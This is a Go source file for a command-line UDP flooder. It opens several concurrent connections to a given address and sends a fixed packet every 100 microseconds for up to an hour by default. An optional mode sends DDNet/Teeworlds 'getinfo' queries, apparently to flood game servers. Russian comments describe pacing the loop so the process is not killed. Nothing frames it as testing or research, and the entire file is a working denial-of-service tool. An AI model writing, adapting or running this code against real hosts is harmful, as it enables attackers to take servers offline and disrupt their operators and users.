package main

import (
	"flag"
	"net"
	"time"
)

func main() {
	addr := flag.String("addr", "", "Target address")
	conns := flag.Int("c", 1, "Connections")
	duration := flag.String("d", "3600s", "Duration")
	ddnet := flag.Bool("ddnet-info", false, "DDNet mode")
	flag.Parse()

	if *addr == "" { return }

	d, _ := time.ParseDuration(*duration)
	deadline := time.Now().Add(d)

	for i := 0; i < *conns; i++ {
		go func() {
			payload := []byte("\xff\xff\xff\xffgetinfo")
			if !*ddnet {
				payload = []byte("udp-payload-data-packet")
			}
			// Используем один раз установленное соединение для экономии ресурсов
			conn, err := net.Dial("udp", *addr)
			if err != nil { return }
			defer conn.Close()

			for time.Now().Before(deadline) {
				conn.Write(payload)
				// Микро-пауза (100 микросекунд), чтобы CPU не сгорал и процесс не убивали
				time.Sleep(100 * time.Microsecond) 
			}
		}()
	}
	time.Sleep(d)
}
